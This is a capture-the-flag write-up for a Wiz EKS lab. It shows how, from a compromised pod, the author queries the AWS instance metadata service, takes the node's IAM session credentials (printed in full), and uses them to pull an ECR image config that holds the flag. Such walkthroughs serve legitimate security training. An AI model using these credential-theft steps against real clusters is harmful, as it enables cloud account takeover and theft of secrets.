---
tags:
  - Kubernetes
  - AWSInstanceMetadataAPI
title: EKS Cluster Game - Image Inquisition
description: Accessing the Instance Metadata service from a compromised pod
reference: https://eksclustergames.com/challenge/3
---

## Challenge

A pod's image holds more than just code. Dive deep into its ECR repository, inspect the image layers, and uncover the hidden secret.

Remember: You are running inside a compromised EKS pod.

For your convenience, the [crane](https://github.com/google/go-containerregistry/blob/main/cmd/crane/doc/crane.md) utility is already pre-installed on the machine.

## Solution

> **Hint**: You are running inside a compromised EKS pod.

### 1. List the permissions

no attack point is found.

```
root@wiz-eks-challenge:~# kubectl auth can-i --list
warning: the list may be incomplete: webhook authorizer does not support user rule resolution
Resources                                       Non-Resource URLs                     Resource Names     Verbs
selfsubjectaccessreviews.authorization.k8s.io   []                                    []                 [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []                 [create]
pods                                            []                                    []                 [get list]
                                                [/.well-known/openid-configuration]   []                 [get]
                                                [/api/*]                              []                 [get]
                                                [/api]                                []                 [get]
                                                [/apis/*]                             []                 [get]
                                                [/apis]                               []                 [get]
                                                [/healthz]                            []                 [get]
                                                [/healthz]                            []                 [get]
                                                [/livez]                              []                 [get]
                                                [/livez]                              []                 [get]
                                                [/openapi/*]                          []                 [get]
                                                [/openapi]                            []                 [get]
                                                [/openid/v1/jwks]                     []                 [get]
                                                [/readyz]                             []                 [get]
                                                [/readyz]                             []                 [get]
                                                [/version/]                           []                 [get]
                                                [/version/]                           []                 [get]
                                                [/version]                            []                 [get]
                                                [/version]                            []                 [get]
podsecuritypolicies.policy                      []                                    [eks.privileged]   [use]
```

### 2. Try to access the AWS Instance Metadata API

- It works!
- Ref:  https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html

```
root@wiz-eks-challenge:/var/run/secrets/kubernetes.io/serviceaccount# curl http://169.254.169.254/latest/meta-data/                                   
ami-id
ami-launch-index
ami-manifest-path
block-device-mapping/
events/
hostname
iam/
identity-credentials/
instance-action
instance-id
instance-life-cycle
instance-type
local-hostname
local-ipv4
mac
metrics/
network/
placement/
profile
public-hostname
public-ipv4
reservation-id
security-groups
services/
```

### 3. Try to get the host IAM credential

We got it!

```
root@wiz-eks-challenge:~# curl http://169.254.169.254/latest/meta-data/iam/security-credentials/                                        
eks-challenge-cluster-nodegroup-NodeInstanceRoleroot@wiz-eks-challenge:~# curl http://169.254.169.254/latest/meta-data/iam/security-credentials/eks-challenge-cluster-nodegroup-NodeInstanceRole
{"AccessKeyId":"ASIA2AVYNEVMUPJENVVZ","Expiration":"2025-05-17 07:34:12+00:00","SecretAccessKey":"ubWFvc6Ow2Mv6eF9ByvmzZnBcz49AMx2YR3FcJ7J","SessionToken":"FwoGZXIvYXdzELD//////////wEaDJC/ngmw7XwwBz6dIiK3AT1qmN06Q7CEGWb8dw8qvrPO1/JZox74xCKNNWgIBnSdVq7e+/kG3d0LHIfoHEl/+uLQ2dKNmIP6KSdgY9jo5F6u2GFOps+au/owpGuGk7P74LWvQ1WtNxls+G7HeoS2eKXLfolpqwdGAS606I5MqBuuJGipwN5k1VrxMDQBmFMN8DPeXttgJp7lgm+hJ7SH+yqEh20QEbXvnrDEkNl85O8A/We9ywwyMzCGAl0y7Ofx9tXqhavLgijk26DBBjItMpgihaHuVArJddtLkU92cmXXjum5HUm7SHo27dcRQt7MqC3ExRbSZZGDx5v5"}
```

### 4. get the ECR and container image information

- region: `us-west-1`
- aws account id: `688655246681`
- image: `central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01`

```
root@wiz-eks-challenge:~# kubectl get pods -o yaml | grep image
    - image: 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01
      imagePullPolicy: IfNotPresent
      image: sha256:575a75bed1bdcf83fba40e82c30a7eec7bc758645830332a38cef238cd4cf0f3
      imageID: 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01
```

### 5. configure AWS CLI's access credentials

```
root@wiz-eks-challenge:~/.aws# cat credentials 
[default]
aws_access_key_id = ASIA2AVYNEVMRRZCMB5Q
aws_secret_access_key = vyagPCVKXhQ+WcOzM9yhuqx2HYYwwSSN3QOFKR3Z
aws_session_token = FwoGZXIvYXdzELH//////////wEaDI7rf0+GM72+N+WnYiK3AbAuuFbdwCJCWcMNvfJCZJsa3PKWZPzHuYaikP2IqKNouuMZgUdwCF1kOjY82AGG3UjUorfzVWSfT+sB75N2NiQlK5A2QE+Nf94e0Nc7+Q+axgEYSk6JSeklIqtrWeqdD6ktqZJ6d3cEt7MEJ9VbHoNiQ8+VkrERmLMJD7qIq+aT5+lMqtwL2Fvupav8hL3xX3rQmdhCTFWubuSfEvG40XBhZXc1ZUMx64CT4YAmL42qvtlT/wSqEyii7KDBBjIt1KGbEtdH3TAr7C4md3vrlUcGaNjewKgXvs2hyi3szff8duECZzWUIarwD+Ta
root@wiz-eks-challenge:~/.aws# cat config 
[default]
region = us-west-1
output=json
root@wiz-eks-challenge:~/.aws# aws ecr describe-repositories
{
    "repositories": [
        {
            "repositoryArn": "arn:aws:ecr:us-west-1:688655246681:repository/central_repo-aaf4a7c",
            "registryId": "688655246681",
            "repositoryName": "central_repo-aaf4a7c",
            "repositoryUri": "688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c",
            "createdAt": "2023-11-01T13:31:26.721000+00:00",
            "imageTagMutability": "MUTABLE",
            "imageScanningConfiguration": {
                "scanOnPush": false
            },
            "encryptionConfiguration": {
                "encryptionType": "AES256"
            }
        }
    ]
}
```

### 6.  get ECR authorisation token and get the image manifest

Why not use `crane login`? I tried to use it. I can log in successfully, but I faced some errors when `crane pull`.

```
root@wiz-eks-challenge:~# TOKEN=$(aws ecr get-authorization-token --output text --query 'authorizationData[].authorizationToken')
root@wiz-eks-challenge:~# curl -i -H "Authorization: Basic $TOKEN" https://688655246681.dkr.ecr.us-west-1.amazonaws.com/v2/central_repo-aaf4a7c/manifests/374f28d8-container
HTTP/1.1 200 OK
Content-Length: 735
Content-Type: application/vnd.docker.distribution.manifest.v2+json
Docker-Distribution-Api-Version: registry/2.0
Sizes: 
Date: Sat, 17 May 2025 07:27:00 GMT

{
   "schemaVersion": 2,
   "mediaType": "application/vnd.docker.distribution.manifest.v2+json",
   "config": {
      "mediaType": "application/vnd.docker.container.image.v1+json",
      "size": 1236,
      "digest": "sha256:575a75bed1bdcf83fba40e82c30a7eec7bc758645830332a38cef238cd4cf0f3"
   },
   "layers": [
      {
         "mediaType": "application/vnd.docker.image.rootfs.diff.tar.gzip",
         "size": 2219949,
         "digest": "sha256:3f4d90098f5b5a6f6a76e9d217da85aa39b2081e30fa1f7d287138d6e7bf0ad7"
      },
      {
         "mediaType": "application/vnd.docker.image.rootfs.diff.tar.gzip",
         "size": 164,
         "digest": "sha256:e7310b04c944c3e0bbb9ebc04b885dc7ad937061e0dc77c73449ef133eab4fd9"
      }
   ]
```

### 7. Inspect the image config

The flag is in the config.

```
root@wiz-eks-challenge:~# curl -O -s -L -H "Authorization: Basic $TOKEN" https://688655246681.dkr.ecr.us-west-1.amazonaws.com/v2/central_repo-aaf4a7c/blobs/sha256:575a75bed1bd
cf83fba40e82c30a7eec7bc758645830332a38cef238cd4cf0f3
root@wiz-eks-challenge:~# ls
layer2.tar.gz  sha256:575a75bed1bdcf83fba40e82c30a7eec7bc758645830332a38cef238cd4cf0f3
root@wiz-eks-challenge:~# less sha256\:575a75bed1bdcf83fba40e82c30a7eec7bc758645830332a38cef238cd4cf0f3 
root@wiz-eks-challenge:~# cat sha256\:575a75bed1bdcf83fba40e82c30a7eec7bc758645830332a38cef238cd4cf0f3 
{"architecture":"amd64","config":{"Env":["PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"],"Cmd":["/bin/sleep","3133337"],"ArgsEscaped":true,"OnBuild":null},"created":"2023-11-01T13:32:07.782534085Z","history":[{"created":"2023-07-18T23:19:33.538571854Z","created_by":"/bin/sh -c #(nop) ADD file:7e9002edaafd4e4579b65c8f0aaabde1aeb7fd3f8d95579f7fd3443cef785fd1 in / "},{"created":"2023-07-18T23:19:33.655005962Z","created_by":"/bin/sh -c #(nop)  CMD [\"sh\"]","empty_layer":true},{"created":"2023-11-01T13:32:07.782534085Z","created_by":"RUN sh -c #ARTIFACTORY_USERNAME=challenge@eksclustergames.com ARTIFACTORY_TOKEN=wiz_eks_challenge{the_history_of_container_images_could_reveal_the_secrets_to_the_future} ARTIFACTORY_REPO=base_repo /bin/sh -c pip install setuptools --index-url intrepo.eksclustergames.com # buildkit # buildkit","comment":"buildkit.dockerfile.v0"},{"created":"2023-11-01T13:32:07.782534085Z","created_by":"CMD [\"/bin/sleep\" \"3133337\"]","comment":"buildkit.dockerfile.v0","empty_layer":true}],"os":"linux","rootfs":{"type":"layers","diff_ids":["sha256:3d24ee258efc3bfe4066a1a9fb83febf6dc0b1548dfe896161533668281c9f4f","sha256:9057b2e37673dc3d5c78e0c3c5c39d5d0a4cf5b47663a4f50f5c6d56d
```

